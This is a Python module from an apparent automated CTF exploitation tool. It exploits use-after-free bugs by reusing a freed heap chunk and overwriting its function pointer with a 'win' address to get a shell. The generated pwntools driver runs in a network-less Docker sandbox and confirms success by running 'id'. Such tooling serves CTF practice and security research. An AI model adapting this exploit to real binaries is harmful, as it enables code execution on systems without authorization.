"""Use-after-free por reutilizacion de chunk (sin envenenar tcache) -> secuestro de puntero a
funcion -> shell, verificado por ejecucion.

Patron distinto del de autoheap.py (tcache-poison -> free@GOT=win, que necesita un doble-free
para fabricar un chunk falso en una direccion arbitraria): aqui basta con que el binario tenga un
menu new/free/write/trigger donde 'free' NO anula el puntero (UAF real), y donde el siguiente
malloc del MISMO tamano recicle exactamente ese chunk (tcache LIFO). Si la struct liberada
empieza con un puntero a funcion (patron clasico de CTF, `struct obj { void (*action)(void); ...
};`), sobrescribir esos primeros 8 bytes con la direccion de 'win' y disparar la ruta que llama a
ese puntero da shell sin necesitar ninguna fuga ni corromper metadata del heap.

El menu (numeros de opcion) se reconoce dinamicamente a partir de las cadenas del propio binario
(patron 'N)palabra'), no esta cableado a un binario concreto. Runs en el sandbox binoracle-pwn.
Solo para binarios AUTORIZADOS / CTF / research.
"""
from __future__ import annotations

import os
import shutil
import subprocess

_DRIVER = r'''
import re
import subprocess
import sys
from pwn import *
context.binary = elf = ELF(sys.argv[1], checksec=False); context.log_level = "error"
win = (elf.symbols or {}).get("win")
if not win:
    print("NOT_APPLICABLE (no win)"); sys.exit(1)

KEYWORDS = {
    "new": ("new", "alloc", "add", "create"),
    "free": ("free", "del", "remove"),
    "write": ("edit", "note", "write", "set", "update", "modify"),
    "trigger": ("run", "use", "call", "exec", "trigger"),
}
menu_line = None
opts = None
for raw in re.findall(rb"[ -~]{6,}", elf.data):
    s = raw.decode("latin1")
    toks = re.findall(r"(\d+)\s*\)\s*([A-Za-z_]+)", s)
    if len(toks) < 3:
        continue
    cand = {}
    for num, word in toks:
        wl = word.lower()
        for cat, kws in KEYWORDS.items():
            if cat not in cand and any(kw in wl for kw in kws):
                cand[cat] = int(num)
    if all(c in cand for c in ("new", "free", "write", "trigger")):
        menu_line, opts = raw, cand
        break
if not opts:
    print("NOT_APPLICABLE (no se reconocio un menu new/free/write/trigger)"); sys.exit(1)

SIZES = [16, 24, 32, 40, 48, 56, 64, 8]
ok = False
for sz in SIZES:
    io = None
    try:
        io = process([elf.path], stderr=subprocess.STDOUT)
        io.recvuntil(menu_line, timeout=3)
        io.sendline(str(opts["new"]).encode())
        io.recvuntil(menu_line, timeout=3)
        io.sendline(str(opts["free"]).encode())
        io.recvuntil(menu_line, timeout=3)
        io.sendline(str(opts["write"]).encode())
        io.recv(timeout=0.5)
        io.send(p64(win).ljust(sz, b"A"))
        io.recvuntil(menu_line, timeout=3)
        io.sendline(str(opts["trigger"]).encode())
        io.sendline(b"echo BINORACLE_PWNED; id")
        out = io.recvrepeat(2.5)
        io.close()
    except Exception:
        try:
            if io:
                io.close()
        except Exception:
            pass
        continue
    if b"BINORACLE_PWNED" in out or b"uid=" in out:
        print("VERIFIED win=%#x size=%d opts=%s" % (win, sz, opts))
        ok = True
        break
if not ok:
    print("NOT_VERIFIED win=%#x opts=%s" % (win, opts))
    sys.exit(1)
'''


def _uaf_applicable(binary: str) -> bool:
    """Chequeo barato (sin sandbox): necesita 'win', 'malloc' y 'free' importados. El
    reconocimiento del menu (new/free/write/trigger) se hace dentro del sandbox, donde ya
    tenemos pwntools/ELF cargado; si no aplica, el driver lo reporta como NOT_APPLICABLE."""
    try:
        from elftools.elf.elffile import ELFFile
    except Exception:
        return True
    try:
        names = set()
        with open(binary, "rb") as f:
            elf = ELFFile(f)
            for sec in elf.iter_sections():
                if sec.name in (".symtab", ".dynsym"):
                    for s in sec.iter_symbols():
                        if s.name:
                            names.add(s.name)
        return "win" in names and "malloc" in names and "free" in names
    except Exception:
        return True


def autouaf_shell(binary: str) -> dict:
    """Explota un UAF de reutilizacion de chunk (puntero a funcion en offset 0 de la struct
    liberada) sin envenenar el heap, verificado con shell real en el sandbox."""
    if not shutil.which("docker"):
        return {"ok": False, "note": "docker no disponible"}
    if not _uaf_applicable(binary):
        return {"ok": False, "note": "no aplicable (falta win/malloc/free): UAF por reutilizacion requiere los tres"}
    try:
        img = subprocess.run(["docker", "image", "inspect", "binoracle-pwn"],
                             capture_output=True, timeout=15).returncode
    except subprocess.TimeoutExpired:
        return {"ok": False, "note": "docker no responde (image inspect timeout)"}
    if img != 0:
        return {"ok": False, "note": "falta la imagen 'binoracle-pwn' (make pwn-image)"}
    d = os.path.dirname(os.path.abspath(binary)); name = os.path.basename(binary)
    if not os.path.isdir(d):
        return {"ok": False, "note": f"directorio inexistente: {d}"}
    drv = os.path.join(d, ".binoracle_uaf.py")
    try:
        with open(drv, "w") as f:
            f.write(_DRIVER)
    except OSError as e:
        return {"ok": False, "note": f"no se pudo escribir el driver: {e}"}
    try:
        r = subprocess.run(
            ["docker", "run", "--rm", "--platform", "linux/amd64", "--network", "none",
             "--memory", "512m", "--pids-limit", "256", "--security-opt", "seccomp=unconfined",
             "-v", d + ":/w", "-w", "/w", "binoracle-pwn", "bash", "-c",
             f"chmod +x ./{name}; python3 .binoracle_uaf.py {name}"],
            capture_output=True, text=True, timeout=120)
        out = r.stdout + r.stderr
    except subprocess.TimeoutExpired:
        out = "[timeout]"
    finally:
        try: os.unlink(drv)
        except OSError: pass
    verified = "VERIFIED" in out and "NOT_VERIFIED" not in out
    line = next((l for l in out.splitlines() if l.startswith("VERIFIED")), "")
    return {"ok": True, "verified": verified, "detail": line, "output": out[-600:],
            "note": "UAF (reutilizacion de chunk) -> puntero a funcion=win -> shell (sandbox)" if verified
                    else "no verificado (menu no reconocido, tamano de chunk distinto, o UAF no explotable asi)"}


def render_uaf(r: dict) -> str:
    out = ["## Use-after-free por reutilizacion de chunk (confirmacion por ejecucion)\n"]
    if not r.get("ok"):
        return "\n".join(out + ["No disponible: " + r.get("note", "")])
    out.append(f"- explotado: **{'SI' if r.get('verified') else 'no'}**")
    out.append(r.get("detail") or r.get("note", ""))
    return "\n".join(out)
